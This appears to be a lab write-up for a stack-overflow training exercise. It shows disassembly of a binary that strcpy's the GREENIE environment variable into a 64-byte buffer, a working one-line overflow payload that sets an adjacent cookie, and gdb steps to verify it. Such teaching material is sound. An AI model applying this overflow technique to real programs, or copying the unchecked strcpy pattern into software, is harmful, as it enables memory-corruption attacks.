# ex02 - Environment-variable stack overflow

## Goal
Print `you have correctly modified the variable`.

## Relevant assembly (`main`)
```asm
0804849d: mov  DWORD PTR [esp],0x80485e0     ; "GREENIE"
080484a4: call getenv
080484a9: mov  DWORD PTR [esp+0x5c],eax      ; env value
...
080484c8: mov  DWORD PTR [esp+0x58],0x0       ; cookie
080484d0: mov  eax,DWORD PTR [esp+0x5c]
080484d4: mov  DWORD PTR [esp+0x4],eax
080484d8: lea  eax,[esp+0x18]                ; 64-byte buffer
080484dc: mov  DWORD PTR [esp],eax
080484df: call strcpy
080484e4: mov  eax,DWORD PTR [esp+0x58]     ; cookie
080484e8: cmp  eax,0xd0a0d0a                  ; expected value
```

The value stored in `GREENIE` is copied into a 64-byte stack buffer, allowing the cookie 64 bytes later to be overwritten.

## Exploit
```bash
GREENIE="$(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*64 + b"\x0a\x0d\x0a\x0d")')" ./bin
```

## Why it works
The 64 padding bytes fill the buffer; the next 4 bytes set the `modified` cookie to the value expected by the comparison.

## Extra notes
- The vulnerable input comes from the `GREENIE` environment variable, not argv or stdin.
- `strcpy` copies the environment value into a 64-byte stack buffer. The cookie is at `[esp+0x58]`, 64 bytes after `[esp+0x18]`.
- Debug:
```bash
export GREENIE="$(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*64 + b"\x0a\x0d\x0a\x0d")')"
gdb -q ./bin <<'GDB_EOF'
b *0x080484e4
run
x/4xw $esp+0x58
GDB_EOF
```
- Expected success message: `you have correctly modified the variable`.
